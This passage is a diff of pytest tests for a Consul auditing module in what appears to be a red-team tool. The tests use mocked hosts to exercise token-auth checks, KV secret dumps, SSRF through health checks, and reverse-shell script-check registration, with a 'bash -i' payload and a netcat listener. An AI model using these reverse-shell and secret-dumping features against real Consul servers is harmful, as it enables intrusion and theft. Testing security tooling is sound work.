@@ -2,8 +2,12 @@ from __future__ import annotations
 
 import argparse
 import base64
+import io
 import json
+import ssl
 import urllib.error
+from types import SimpleNamespace
+from typing import Any
 
 import pytest
 
@@ -617,7 +621,7 @@ def test_audit_consul_host_full_auth_flow_with_actions_and_revshell(monkeypatch:
         revshell_check_id="rp-revshell",
     )
 
-    assert record["status"] == "ok"
+    assert record["status"] == "valid_credentials"
     assert record["auth_mode"] == "token"
     assert record["auth_valid"] is True
     assert record["version"] == "1.17.3"
@@ -625,6 +629,245 @@ def test_audit_consul_host_full_auth_flow_with_actions_and_revshell(monkeypatch:
     assert record["service_result"]["ok"] is True
     assert record["ssrf_results"][0]["registered"] is True
     assert record["script_revshell"]["registered"] is True
+
+
+def test_audit_consul_host_debug_stage_telemetry(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        consul,
+        "_probe_consul_scheme",
+        lambda *_args, **_kwargs: (True, "http", False, False, "127.0.0.1:8300", None),
+    )
+    monkeypatch.setattr(consul, "_consul_access_matrix", lambda *_args, **_kwargs: _scope_fixture(True, True, True))
+    monkeypatch.setattr(
+        consul,
+        "_agent_self_probe",
+        lambda *_args, **_kwargs: {
+            "ok": True,
+            "error": None,
+            "version": "1.17.3",
+            "local_script_checks": True,
+            "remote_script_checks": True,
+        },
+    )
+    monkeypatch.setattr(
+        consul,
+        "_audit_consul_host_legacy",
+        lambda *_args, **_kwargs: {
+            "timestamp": "2026-04-10T00:00:00Z",
+            "host": "127.0.0.1",
+            "port": 8500,
+            "is_consul": True,
+            "status": "open_no_auth",
+            "scheme": "http",
+            "insecure_effective": False,
+            "tls_auto_insecure": False,
+            "leader": "127.0.0.1:8300",
+            "version": "1.17.3",
+            "anonymous_scopes": _scope_fixture(True, True, True),
+            "auth_mode": None,
+            "auth_valid": None,
+            "auth_scopes": {},
+            "auth_error": None,
+            "anonymous_self_ok": True,
+            "anonymous_self_error": None,
+            "local_script_checks": True,
+            "remote_script_checks": True,
+            "rce": True,
+            "ssrf_enabled": False,
+            "ssrf_results": [],
+            "script_revshell": None,
+            "keys_requested": False,
+            "kv_key_requested": None,
+            "dump_requested": False,
+            "dump_all_requested": False,
+            "kv_keys_list": None,
+            "kv_keys_error": None,
+            "kv_dump_items": None,
+            "kv_dump_error": None,
+            "services_list_requested": False,
+            "service_dump_name": None,
+            "services_list_source": None,
+            "services_list": None,
+            "services_list_error": None,
+            "service_instances": None,
+            "service_instances_errors": None,
+            "agents_list_requested": False,
+            "agent_dump_name": None,
+            "agents_list_source": None,
+            "agents_list": None,
+            "agents_list_error": None,
+            "checks_list_requested": False,
+            "check_dump_id": None,
+            "checks_list_source": None,
+            "checks_list": None,
+            "checks_list_error": None,
+            "nodes_list_requested": False,
+            "node_dump_name": None,
+            "nodes_list_source": None,
+            "nodes_list": None,
+            "nodes_list_error": None,
+            "service_result": None,
+            "service_args": None,
+            "error": None,
+            "elapsed_ms": 2,
+            "auth_required": False,
+        },
+    )
+
+    record = consul._audit_consul_host(
+        "127.0.0.1",
+        8500,
+        1.0,
+        0,
+        token=None,
+        username=None,
+        password=None,
+        do_ssrf=False,
+        ssrf_urls=[],
+        show_keys=False,
+        kv_key=None,
+        dump_requested=False,
+        dump_all_requested=False,
+        show_services=False,
+        show_agents=False,
+        show_checks=False,
+        check_dump_id=None,
+        show_nodes=False,
+        service_name=None,
+        service_dump_name=None,
+        agent_dump_name=None,
+        node_dump_name=None,
+        delete_service=False,
+        service_args=None,
+        revshell_enabled=False,
+        delete_revshell=False,
+        revshell_listen=False,
+        revshell_host=None,
+        revshell_port=None,
+        revshell_payload=None,
+        revshell_check_id=None,
+        debug=True,
+    )
+
+    assert record["status"] == "open_no_auth"
+    stage_names = [str(item.get("stage_name") or "") for item in record.get("stages") or [] if isinstance(item, dict)]
+    assert "detect_protocol" in stage_names
+    assert "auth_inference_credentials" in stage_names
+    assert "access_capabilities" in stage_names
+    assert "data" in stage_names
+    assert any("stage_timing_summary" in str(item) for item in (record.get("debug_events") or []))
+
+
+def test_audit_consul_targets_two_pass_gate_and_debug_markers(monkeypatch: pytest.MonkeyPatch) -> None:
+    def fake_call(*_args, run_deep_checks: bool, **_kwargs):  # type: ignore[no-untyped-def]
+        host = str(_args[0])
+        base = {
+            "timestamp": "2026-04-10T00:00:00Z",
+            "host": host,
+            "port": 8500,
+            "is_consul": True,
+            "scheme": "http",
+            "insecure_effective": False,
+            "tls_auto_insecure": False,
+            "leader": "127.0.0.1:8300",
+            "version": "1.17.3",
+            "auth_mode": None,
+            "auth_valid": None,
+            "auth_scopes": {},
+            "auth_error": None,
+            "anonymous_self_ok": True,
+            "anonymous_self_error": None,
+            "local_script_checks": True,
+            "remote_script_checks": True,
+            "rce": True,
+            "ssrf_enabled": False,
+            "ssrf_results": [],
+            "script_revshell": None,
+            "keys_requested": False,
+            "kv_key_requested": None,
+            "dump_requested": False,
+            "dump_all_requested": False,
+            "service_result": None,
+            "service_args": None,
+            "error": None,
+            "elapsed_ms": 1,
+            "stages": [],
+            "stage_failed_at": None,
+            "stage_durations_ms": {},
+            "stage_attempts": {},
+            "debug_events": [],
+            "debug_events_streamed": False,
+        }
+        if not run_deep_checks:
+            if host == "10.0.0.1":
+                return {
+                    **base,
+                    "status": "open_no_auth",
+                    "auth_required": False,
+                    "anonymous_scopes": _scope_fixture(True, True, True),
+                }
+            return {
+                **base,
+                "status": "auth_required",
+                "auth_required": True,
+                "anonymous_scopes": _scope_fixture(False, False, False),
+            }
+        return {
+            **base,
+            "status": "open_no_auth",
+            "auth_required": False,
+            "anonymous_scopes": _scope_fixture(True, True, True),
+        }
+
+    monkeypatch.setattr(consul, "_call_audit_consul_host_with_thread_debug", fake_call)
+
+    emitted: list[str] = []
+    debug_lines: list[str] = []
+    totals = consul.audit_consul_targets(
+        hosts=["10.0.0.1", "10.0.0.2"],
+        port=8500,
+        timeout=1.0,
+        retries=0,
+        workers=2,
+        token=None,
+        username=None,
+        password=None,
+        do_ssrf=False,
+        ssrf_urls=[],
+        show_keys=False,
+        kv_key=None,
+        dump_requested=False,
+        dump_all_requested=False,
+        show_services=False,
+        show_agents=False,
+        show_checks=False,
+        check_dump_id=None,
+        show_nodes=False,
+        service_name=None,
+        service_dump_name=None,
+        agent_dump_name=None,
+        node_dump_name=None,
+        delete_service=False,
+        service_args=None,
+        revshell_enabled=False,
+        delete_revshell=False,
+        revshell_listen=False,
+        revshell_host=None,
+        revshell_port=None,
+        revshell_payload=None,
+        revshell_check_id=None,
+        output_path=None,
+        output_format="txt",
+        emit_line=emitted.append,
+        logger=None,
+        debug_emit=debug_lines.append,
+    )
+
+    assert totals == (2, 2, 0, False)
+    assert any("pass=1 detect start total=2" in line for line in debug_lines)
+    assert any("pass=2 deep start total=1" in line for line in debug_lines)
+    assert any("10.0.0.1:8500 stage2_gate=run reason=status=open_no_auth" in line for line in debug_lines)
+    assert any("10.0.0.2:8500 stage2_gate=skip reason=status=auth_required" in line for line in debug_lines)
 
 
 def test_audit_consul_host_not_consul_and_fail_record(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -1118,12 +1361,21 @@ def test_service_action_and_revshell_cleanup(monkeypatch: pytest.MonkeyPatch) ->
         ({"timeout": 0}, "--timeout must be > 0"),
         ({"retries": -1}, "--retries must be >= 0"),
         ({"ssrf_port": "8080"}, "--ssrf-port/--ssrf-path require --ssrf-target"),
+        ({"ssrf_target": "127.0.0.1", "ssrf_port": "bad-port"}, "failed to parse --ssrf-port"),
         ({"kv_key": "secret/app"}, "--key requires --dump"),
         ({"service_dump_name": "web"}, "--service requires --dump"),
+        ({"agent_name": "agent-1"}, "--agent requires --dump"),
+        ({"node_name": "node-1"}, "--node requires --dump"),
+        ({"delete_revshell": True}, "--delete requires --revshell or --check-id"),
+        ({"revshell_check_id": "id:"}, "--check-id id:<value> requires a non-empty check id"),
         ({"revshell_check_id": "rp-1"}, "--check-id requires --revshell, --delete, or --dump"),
         ({"revshell_listen": True}, "--listen requires --revshell"),
         ({"revshell": True, "revshell_listen": True}, "--listen requires --lport"),
         ({"revshell": True}, "--lhost is required when --revshell is set"),
+        (
+            {"revshell": True, "revshell_host": "bad host!", "revshell_port": 4444},
+            "--lhost must be a plain IPv4/DNS hostname",
+        ),
     ],
 )
 def test_run_consul_stage_validation_errors(
@@ -1241,3 +1493,1024 @@ def test_run_consul_stage_returns_error_when_target_audit_raises(monkeypatch: py
         for level, msg in _ConsoleCapture.instances[-1].messages
         if level == "error"
     )
+
+
+def test_run_consul_stage_warn_paths_for_revshell_args(monkeypatch: pytest.MonkeyPatch) -> None:
+    _ConsoleCapture.instances.clear()
+    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
+    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
+    monkeypatch.setattr(consul, "audit_consul_targets", lambda **_kwargs: (1, 1, 0, False))
+
+    rc_payload = consul.run_consul_stage(
+        _consul_args(revshell=True, revshell_host="127.0.0.1", revshell_port=4444, revshell_payload="id"),
+        logger=object(),  # type: ignore[arg-type]
+    )
+    assert rc_payload == 0
+    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
+    assert any("--lhost/--lport ignored when --payload is set" in msg for msg in warnings)
+
+    _ConsoleCapture.instances.clear()
+    rc_delete = consul.run_consul_stage(
+        _consul_args(
+            revshell=True,
+            delete_revshell=True,
+            revshell_host="127.0.0.1",
+            revshell_port=4444,
+            revshell_payload="custom",
+        ),
+        logger=object(),  # type: ignore[arg-type]
+    )
+    assert rc_delete == 0
+    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
+    assert any("--lhost/--lport ignored with --revshell --delete" in msg for msg in warnings)
+    assert any("--payload ignored with --revshell --delete" in msg for msg in warnings)
+
+    _ConsoleCapture.instances.clear()
+    rc_plain_delete = consul.run_consul_stage(
+        _consul_args(
+            delete_revshell=True,
+            revshell_check_id="rp-check",
+            revshell_host="127.0.0.1",
+            revshell_port=4444,
+            revshell_payload="custom",
+        ),
+        logger=object(),  # type: ignore[arg-type]
+    )
+    assert rc_plain_delete == 0
+    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
+    assert any("--lhost/--lport ignored with --delete --check-id" in msg for msg in warnings)
+    assert any("--payload ignored with --delete --check-id" in msg for msg in warnings)
+
+
+def test_run_consul_stage_target_parse_and_ssrf_empty_errors(monkeypatch: pytest.MonkeyPatch) -> None:
+    _ConsoleCapture.instances.clear()
+    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
+    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
+
+    monkeypatch.setattr(
+        consul, "collect_scan_target_specs", lambda *_args, **_kwargs: (_ for _ in ()).throw(ValueError("bad targets"))
+    )
+    rc_targets = consul.run_consul_stage(_consul_args(), logger=object())  # type: ignore[arg-type]
+    assert rc_targets == 2
+    assert any(
+        "failed to parse targets: bad targets" in msg
+        for level, msg in _ConsoleCapture.instances[-1].messages
+        if level == "error"
+    )
+
+    _ConsoleCapture.instances.clear()
+    monkeypatch.setattr(
+        consul,
+        "collect_scan_target_specs",
+        lambda *_args, **_kwargs: [SimpleNamespace(host="127.0.0.1", scheme="", explicit_port=None)],
+    )
+    monkeypatch.setattr(consul, "_normalize_ssrf_urls", lambda *_args, **_kwargs: [])
+    rc_ssrf = consul.run_consul_stage(_consul_args(ssrf_target="127.0.0.1"), logger=object())  # type: ignore[arg-type]
+    assert rc_ssrf == 2
+    assert any(
+        "no valid SSRF targets generated" in msg
+        for level, msg in _ConsoleCapture.instances[-1].messages
+        if level == "error"
+    )
+
+
+def test_consul_get_json_any_and_probe_scheme_fallbacks(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        consul, "_request_with_tls_fallback", lambda *_a, **_k: (0, b"", {}, "broken pipe", False, False)
+    )
+    status, payload, error, effective, tls_auto = consul._consul_get_json_any(
+        "127.0.0.1",
+        8500,
+        "/v1/status/leader",
+        1.0,
+        use_https=False,
+        insecure=False,
+        headers=None,
+    )
+    assert (status, payload, error, effective, tls_auto) == (0, None, "broken pipe", False, False)
+
+    monkeypatch.setattr(
+        consul, "_request_with_tls_fallback", lambda *_a, **_k: (200, b"plain-text", {}, None, False, False)
+    )
+    status2, payload2, error2, _, _ = consul._consul_get_json_any(
+        "127.0.0.1",
+        8500,
+        "/v1/status/leader",
+        1.0,
+        use_https=False,
+        insecure=False,
+        headers=None,
+    )
+    assert status2 == 200 and error2 is None
+    assert payload2 == "plain-text"
+
+    responses = iter(
+        [
+            (403, b'"permission denied"', {}, None, False, False),
+        ]
+    )
+    monkeypatch.setattr(consul, "_request_with_tls_fallback", lambda *_a, **_k: next(responses))
+    detected = consul._probe_consul_scheme("127.0.0.1", 8500, 1.0, preferred_scheme="https")
+    assert detected[0] is True
+    assert detected[1] == "https"
+
+
+def test_consul_catalog_and_kv_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (401, None, None, False, False))
+    services, services_error = consul._consul_catalog_services_list(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+    )
+    assert services is None
+    assert services_error == "Unauthorized"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, {}, None, False, False))
+    kv_keys, kv_keys_error = consul._consul_kv_keys_list(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+    )
+    assert kv_keys is None
+    assert kv_keys_error == "invalid kv keys response"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (404, None, None, False, False))
+    kv_dump, kv_dump_error = consul._consul_kv_dump(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        key_name="missing/key",
+    )
+    assert kv_dump == []
+    assert kv_dump_error is None
+
+
+def test_consul_ssrf_probe_register_poll_and_cleanup_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    check_id = "redposture-ssrf-abcdefghij"
+    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: (200, {}, None))
+    checks_responses = iter(
+        [
+            (200, {"id": "skip"}, None),
+            (
+                200,
+                {
+                    check_id: {
+                        "Status": "passing",
+                        "Output": "HTTP 200",
+                    }
+                },
+                None,
+            ),
+        ]
+    )
+
+    def fake_get_checks(*_args, **_kwargs):  # type: ignore[no-untyped-def]
+        return next(checks_responses)
+
+    put_calls: list[str] = []
+
+    def fake_put_no_body(*_args, **_kwargs):  # type: ignore[no-untyped-def]
+        put_calls.append("deregister")
+        return 204, None
+
+    monotonic_values = iter([0.0, 0.1, 0.2, 0.3, 5.0])
+    monkeypatch.setattr(consul, "_consul_get_checks", fake_get_checks)
+    monkeypatch.setattr(consul, "_consul_put_no_body", fake_put_no_body)
+    monkeypatch.setattr(consul.time, "sleep", lambda _x: None)
+    monkeypatch.setattr(consul.time, "monotonic", lambda: next(monotonic_values))
+    monkeypatch.setattr(consul.time, "time_ns", lambda: 12345)
+    monkeypatch.setattr(consul.base64, "urlsafe_b64encode", lambda _b: b"abcdefghij")
+
+    result = consul._consul_ssrf_probe(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        target_url="http://127.0.0.1:9100/metrics",
+    )
+    assert result["registered"] is True
+    assert result["check_id"] == check_id
+    assert result["status"] == "passing"
+    assert result["output"] == "HTTP 200"
+    assert result["deregistered"] is True
+    assert put_calls
+
+    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: (500, {}, None))
+    failed_register = consul._consul_ssrf_probe(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        target_url="http://127.0.0.1:9100/metrics",
+    )
+    assert failed_register["registered"] is False
+    assert "status=500" in str(failed_register["register_error"])
+
+
+def test_consul_script_revshell_and_cleanup_branches(monkeypatch: pytest.MonkeyPatch) -> None:
+    missing_target = consul._consul_script_revshell(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        lhost=None,
+        lport=None,
+        payload_cmd=None,
+        check_id="rp-check",
+    )
+    assert missing_target["attempted"] is False
+    assert "missing revshell target" in str(missing_target["register_error"])
+
+    put_json_responses = iter(
+        [
+            (400, {"error": "Script not allowed"}, None),
+            (204, {}, None),
+        ]
+    )
+    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: next(put_json_responses))
+    revshell = consul._consul_script_revshell(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        lhost="127.0.0.1",
+        lport=4444,
+        payload_cmd=None,
+        check_id="rp-check",
+        wait_after_register=False,
+    )
+    assert revshell["registered"] is True
+    assert revshell["register_mode"] == "Args"
+    assert revshell["wait_seconds"] == 0.0
+
+    monkeypatch.setattr(consul, "_consul_get_checks", lambda *_a, **_k: (200, {"rp-check": {}}, None))
+    monkeypatch.setattr(consul, "_consul_put_no_body", lambda *_a, **_k: (500, None))
+    cleanup = consul._consul_script_revshell_cleanup(
+        "127.0.0.1",
+        8500,
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        check_id="rp-check",
+    )
+    assert cleanup["queried"] is True
+    assert cleanup["matched"] == 1
+    assert cleanup["deleted"] == 0
+    assert cleanup["items"][0]["ok"] is False
+
+
+def test_start_local_nc_listener_branch_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(consul.shutil, "which", lambda *_a, **_k: None)
+    monkeypatch.setattr(consul.time, "sleep", lambda _x: None)
+
+    def raise_not_found(*_a, **_k):  # type: ignore[no-untyped-def]
+        raise FileNotFoundError
+
+    monkeypatch.setattr(consul.subprocess, "Popen", raise_not_found)
+    not_found = consul._start_local_nc_listener(4444)
+    assert not_found["started"] is False
+    assert "not found" in str(not_found["error"])
+
+    def raise_oserror(*_a, **_k):  # type: ignore[no-untyped-def]
+        raise OSError("permission denied")
+
+    monkeypatch.setattr(consul.subprocess, "Popen", raise_oserror)
+    os_error = consul._start_local_nc_listener(4444)
+    assert os_error["started"] is False
+    assert "permission denied" in str(os_error["error"])
+
+    class _ProcDone:
+        pid = 111
+
+        def poll(self) -> int | None:
+            return 1
+
+    monkeypatch.setattr(consul.subprocess, "Popen", lambda *_a, **_k: _ProcDone())
+    done = consul._start_local_nc_listener(4444)
+    assert done["started"] is False
+    assert "exited rc=1" in str(done["error"])
+
+    class _ProcRunning:
+        pid = 222
+
+        def poll(self) -> int | None:
+            return None
+
+    monkeypatch.setattr(consul.subprocess, "Popen", lambda *_a, **_k: _ProcRunning())
+    running = consul._start_local_nc_listener(4444)
+    assert running["started"] is True
+    assert running["pid"] == 222
+
+
+@pytest.mark.parametrize(
+    ("raw", "expected"),
+    [
+        ("[Errno 113] No route to host", "network unreachable"),
+        ("temporary failure in name resolution", "dns lookup temporary failure"),
+        ("SSL HTTP REQUEST", "tls/http protocol mismatch"),
+        ("operation not permitted", "operation not permitted by local environment"),
+        ("[Errno 999] custom detail", "custom detail"),
+    ],
+)
+def test_friendly_error_text_additional_branches(raw: str, expected: str) -> None:
+    assert consul._friendly_error_text(raw) == expected
+
+
+def test_scope_probe_and_agent_self_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (0, None, "broken pipe", False, False))
+    probe_error = consul._scope_probe(
+        "127.0.0.1",
+        8500,
+        "/v1/catalog/services",
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        count_fn=lambda _payload: 1,
+    )
+    assert probe_error["ok"] is False
+    assert probe_error["error"] == "broken pipe"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (403, {"x": 1}, None, False, False))
+    probe_forbidden = consul._scope_probe(
+        "127.0.0.1",
+        8500,
+        "/v1/catalog/services",
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        count_fn=lambda _payload: 1,
+    )
+    assert probe_forbidden["error"] == "Forbidden"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (500, {"x": 1}, None, False, False))
+    probe_unexpected = consul._scope_probe(
+        "127.0.0.1",
+        8500,
+        "/v1/catalog/services",
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        count_fn=lambda _payload: 1,
+    )
+    assert "unexpected status=500" in str(probe_unexpected["error"]) or "{'x': 1}" in str(probe_unexpected["error"])
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (401, {}, None, False, False))
+    self_unauth = consul._agent_self_probe("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
+    assert self_unauth["ok"] is False
+    assert self_unauth["error"] == "Unauthorized"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, "bad", None, False, False))
+    self_invalid = consul._agent_self_probe("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
+    assert self_invalid["ok"] is False
+    assert self_invalid["error"] == "unexpected status=200"
+
+
+def test_consul_access_matrix_invokes_three_probes(monkeypatch: pytest.MonkeyPatch) -> None:
+    calls: list[str] = []
+
+    def fake_scope_probe(
+        _host: str,
+        _port: int,
+        path: str,
+        _timeout: float,
+        *,
+        scheme: str,
+        insecure: bool,
+        headers: dict[str, str] | None = None,
+        count_fn,
+    ) -> dict[str, Any]:
+        _ = (scheme, insecure, headers, count_fn)
+        calls.append(path)
+        return {"ok": True, "status": 200, "count": 1, "error": None}
+
+    monkeypatch.setattr(consul, "_scope_probe", fake_scope_probe)
+    scopes = consul._consul_access_matrix("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
+    assert set(scopes.keys()) == {"kv", "services", "agents"}
+    assert calls == ["/v1/kv/?keys&recurse", "/v1/catalog/services", "/v1/agent/members"]
+
+
+def test_audit_consul_host_legacy_with_rich_flow(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        consul,
+        "_probe_consul_scheme",
+        lambda *_a, **_k: (True, "http", False, False, "127.0.0.1:8300", None),
+    )
+    monkeypatch.setattr(
+        consul,
+        "_consul_access_matrix",
+        lambda *_a, headers=None, **_k: (
+            _scope_fixture(False, False, False) if headers is None else _scope_fixture(True, True, True)
+        ),
+    )
+    monkeypatch.setattr(
+        consul,
+        "_agent_self_probe",
+        lambda *_a, headers=None, **_k: (
+            {"ok": False, "error": "denied", "version": None, "local_script_checks": None, "remote_script_checks": None}
+            if headers is None
+            else {
+                "ok": True,
+                "error": None,
+                "version": "1.17.3",
+                "local_script_checks": True,
+                "remote_script_checks": True,
+            }
+        ),
+    )
+    monkeypatch.setattr(consul, "_consul_kv_keys_list", lambda *_a, **_k: (["a", "b"], None))
+    monkeypatch.setattr(
+        consul,
+        "_consul_kv_dump",
+        lambda *_a, **_k: ([{"key": "secret/app", "value": "v", "flags": 0, "modify_index": 1}], None),
+    )
+    monkeypatch.setattr(consul, "_consul_catalog_services_list", lambda *_a, **_k: ([{"name": "web"}], None))
+    monkeypatch.setattr(consul, "_consul_get_checks", lambda *_a, **_k: (200, {"service:web": {}}, None))
+    monkeypatch.setattr(
+        consul,
+        "_consul_health_service_instances",
+        lambda *_a, **_k: ([{"node_name": "n1", "service_id": "web-1", "checks": []}], None),
+    )
+    monkeypatch.setattr(consul, "_consul_agent_members_list", lambda *_a, **_k: ([{"name": "n1"}], None))
+    monkeypatch.setattr(consul, "_consul_catalog_nodes_list", lambda *_a, **_k: ([{"name": "n1"}], None))
+    monkeypatch.setattr(
+        consul, "_consul_service_action", lambda *_a, **_k: {"name": "svc", "action": "delete", "ok": True}
+    )
+    monkeypatch.setattr(
+        consul,
+        "_consul_ssrf_probe",
+        lambda *_a, **_k: {"target_url": "http://t", "registered": True, "status": "passing", "deregistered": True},
+    )
+    monkeypatch.setattr(
+        consul,
+        "_consul_script_revshell_cleanup",
+        lambda *_a, **_k: {
+            "action": "delete",
+            "queried": True,
+            "matched": 1,
+            "deleted": 1,
+            "items": [{"check_id": "x", "ok": True}],
+        },
+    )
+
+    record = consul._audit_consul_host_legacy(
+        "127.0.0.1",
+        8500,
+        1.0,
+        0,
+        token="root",
+        username=None,
+        password=None,
+        do_ssrf=True,
+        ssrf_urls=["http://127.0.0.1:9100"],
+        show_keys=True,
+        kv_key=None,
+        dump_requested=True,
+        dump_all_requested=True,
+        show_services=True,
+        show_agents=True,
+        show_checks=True,
+        check_dump_id=None,
+        show_nodes=True,
+        service_name="svc",
+        service_dump_name="web",
+        agent_dump_name="n1",
+        node_dump_name="n1",
+        delete_service=True,
+        service_args=None,
+        revshell_enabled=False,
+        delete_revshell=True,
+        revshell_listen=False,
+        revshell_host=None,
+        revshell_port=None,
+        revshell_payload=None,
+        revshell_check_id="id-1",
+    )
+    assert record["is_consul"] is True
+    assert record["status"] == "ok"
+    assert record["auth_mode"] == "token"
+    assert record["auth_valid"] is True
+    assert record["rce"] is True
+    assert record["service_result"]["ok"] is True
+    assert record["script_revshell"]["action"] == "delete"
+    assert record["ssrf_results"][0]["registered"] is True
+
+
+def test_detail_lines_error_and_revshell_variants() -> None:
+    base = {
+        "host": "127.0.0.1",
+        "port": 8500,
+        "is_consul": True,
+        "anonymous_scopes": {},
+        "auth_scopes": {},
+        "keys_requested": True,
+        "dump_requested": False,
+        "kv_keys_list": None,
+        "kv_keys_error": "denied",
+        "services_list_requested": True,
+        "services_list": None,
+        "services_list_error": "forbidden",
+        "agents_list_requested": True,
+        "agents_list": None,
+        "agents_list_error": "forbidden",
+        "checks_list_requested": True,
+        "checks_list": None,
+        "checks_list_error": "forbidden",
+        "nodes_list_requested": True,
+        "nodes_list": None,
+        "nodes_list_error": "forbidden",
+        "service_result": {"name": "svc", "action": "create", "ok": False, "error": "boom", "status": 500},
+        "ssrf_results": [
+            {
+                "target_url": "http://127.0.0.1:9100",
+                "registered": False,
+                "register_error": "denied",
+                "status": "",
+                "poll_error": "timeout",
+                "output": "",
+                "deregistered": False,
+                "deregister_error": "missing",
+            }
+        ],
+    }
+    delete_record = {
+        **base,
+        "script_revshell": {
+            "action": "delete",
+            "target_check_id": "id-1",
+            "queried": False,
+            "query_error": "permission denied",
+            "matched": 0,
+            "deleted": 0,
+            "items": [],
+        },
+    }
+    create_record = {
+        **base,
+        "script_revshell": {
+            "action": "create",
+            "listener": "127.0.0.1:4444",
+            "auto_cleanup": False,
+            "script": "bash -i",
+            "registered": False,
+            "register_error": "forbidden",
+            "register_status": 403,
+        },
+    }
+
+    delete_lines = consul._detail_lines(delete_record, "txt", debug=True)
+    delete_text = "\n".join(delete_lines)
+    assert "keys unavailable err=denied" in delete_text
+    assert "services unavailable err=forbidden" in delete_text
+    assert "agents unavailable err=forbidden" in delete_text
+    assert "checks unavailable err=forbidden" in delete_text
+    assert "nodes unavailable err=forbidden" in delete_text
+    assert "service create failed err=boom status=500" in delete_text
+    assert "check register failed err=denied" in delete_text
+    assert "probe failed err=timeout" in delete_text
+    assert "checks query failed err=permission denied" in delete_text
+
+    create_lines = consul._detail_lines(create_record, "txt", debug=True)
+    create_text = "\n".join(create_lines)
+    assert "Reverse-shell script-check (listener:127.0.0.1:4444) (auto_cleanup:False)" in create_text
+    assert "payload=bash -i" in create_text
+    assert "check register failed err=forbidden" in create_text
+
+
+def test_audit_consul_host_staged_deep_fail_and_detect_only(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(consul, "_retry_delay", lambda _i: 0.0)
+    monkeypatch.setattr(
+        consul,
+        "_probe_consul_scheme",
+        lambda *_a, **_k: (True, "http", False, False, "127.0.0.1:8300", None),
+    )
+    monkeypatch.setattr(consul, "_consul_access_matrix", lambda *_a, **_k: _scope_fixture(True, True, True))
+    monkeypatch.setattr(
+        consul,
+        "_agent_self_probe",
+        lambda *_a, **_k: {
+            "ok": True,
+            "error": None,
+            "version": "1.17.3",
+            "local_script_checks": True,
+            "remote_script_checks": True,
+        },
+    )
+    monkeypatch.setattr(
+        consul,
+        "_audit_consul_host_legacy",
+        lambda *_a, **_k: {"is_consul": False, "status": "fail", "error": "deep failed"},
+    )
+
+    deep_fail = consul._audit_consul_host(
+        "127.0.0.1",
+        8500,
+        1.0,
+        0,
+        token=None,
+        username=None,
+        password=None,
+        do_ssrf=False,
+        ssrf_urls=[],
+        show_keys=False,
+        kv_key=None,
+        dump_requested=False,
+        dump_all_requested=False,
+        show_services=False,
+        show_agents=False,
+        show_checks=False,
+        check_dump_id=None,
+        show_nodes=False,
+        service_name=None,
+        service_dump_name=None,
+        agent_dump_name=None,
+        node_dump_name=None,
+        delete_service=False,
+        service_args=None,
+        revshell_enabled=False,
+        delete_revshell=False,
+        revshell_listen=False,
+        revshell_host=None,
+        revshell_port=None,
+        revshell_payload=None,
+        revshell_check_id=None,
+        debug=True,
+        run_deep_checks=True,
+    )
+    assert deep_fail["is_consul"] is True
+    assert deep_fail["status"] == "open_no_auth"
+    assert deep_fail["error"] == "deep failed"
+
+    detect_only = consul._audit_consul_host(
+        "127.0.0.1",
+        8500,
+        1.0,
+        0,
+        token=None,
+        username=None,
+        password=None,
+        do_ssrf=False,
+        ssrf_urls=[],
+        show_keys=False,
+        kv_key=None,
+        dump_requested=False,
+        dump_all_requested=False,
+        show_services=False,
+        show_agents=False,
+        show_checks=False,
+        check_dump_id=None,
+        show_nodes=False,
+        service_name=None,
+        service_dump_name=None,
+        agent_dump_name=None,
+        node_dump_name=None,
+        delete_service=False,
+        service_args=None,
+        revshell_enabled=False,
